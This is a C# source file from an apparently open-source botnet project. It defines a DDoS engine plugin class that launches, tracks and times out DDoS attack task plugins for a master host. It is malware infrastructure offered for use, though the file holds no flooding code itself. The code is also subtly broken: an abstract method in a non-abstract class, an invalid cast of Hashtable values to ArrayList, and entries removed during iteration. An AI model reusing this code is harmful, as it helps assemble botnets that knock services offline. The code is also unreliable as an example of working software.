using System;
using System.Collections;
using System.Text;

using OpenSourceBotNet.Core;
using OpenSourceBotNet.Plugins.Engines;

namespace OpenSourceBotNet.Plugins.Engines.Plugins.DDoS
{
    public class DDoSEnginePlugin : FluxEnginePlugin
    {
        public Hashtable htPluginPlugins;

        private System.Threading.Timer tmrTimeoutPluginPlugins;
        private bool bTimeoutCheckRunning = false;

        public DDoSEnginePlugin()
        {
            htPluginPlugins = new Hashtable();

            tmrTimeoutPluginPlugins = new System.Threading.Timer(new System.Threading.TimerCallback(TimeoutCheck), null, 30000, 45000);
        }

        public void LaunchPluginPlugin(DDoSPluginPlugin ddosPluginPlugin) 
        {
            ddosPluginPlugin._fireFinished += ddosPluginPlugin__fireFinished;
            ddosPluginPlugin.Start();
        }

        void ddosPluginPlugin__fireFinished(string sPluginTaskKeyID)
        {
            if (htPluginPlugins.ContainsKey(sPluginTaskKeyID) == true)
            {
                DDoSPluginPlugin ddosPluginPlugin = (DDoSPluginPlugin)htPluginPlugins[sPluginTaskKeyID];

                RemoveWatchPluginPlugin(sPluginTaskKeyID);

                ddosPluginPlugin.Shutdown();
            }
        }

        public void AddWatchPluginPlugin(DDoSPluginPlugin ddosPluginPlugin)
        {
            if (htPluginPlugins.ContainsKey(ddosPluginPlugin.sPluginTaskKeyID) == false)
            {
                htPluginPlugins.Add(ddosPluginPlugin.sPluginTaskKeyID, ddosPluginPlugin);
            }
        }

        public void RemoveWatchPluginPlugin(string sPluginTaskKeyID)
        {
            if (htPluginPlugins.ContainsKey(sPluginTaskKeyID) == true)
            {
                htPluginPlugins.Remove(sPluginTaskKeyID);
            }
        }

        public void RemoveWatchPluginPlugin(DDoSPluginPlugin ddosPluginPlugin)
        {
            if (htPluginPlugins.ContainsKey(ddosPluginPlugin.sPluginTaskKeyID) == true)
            {
                htPluginPlugins.Remove(ddosPluginPlugin.sPluginTaskKeyID);
            }
        }

        public void TimeoutCheck(object obj)
        {
            if (bTimeoutCheckRunning == true)
            {
                return;
            }

            bTimeoutCheckRunning = true;

            ArrayList alDDosPluginPlugins = (ArrayList)htPluginPlugins.Values;

            foreach (DDoSPluginPlugin ddosPluginPlugin in alDDosPluginPlugins)
            {
                if (ddosPluginPlugin.IsAlive() == false)
                {
                    RemoveWatchPluginPlugin(ddosPluginPlugin);

                    ddosPluginPlugin.Shutdown();
                }
            }

            bTimeoutCheckRunning = false;
        }

        public abstract object[] WorkRequest(string sMasterHostWorkRequest);
    }
}
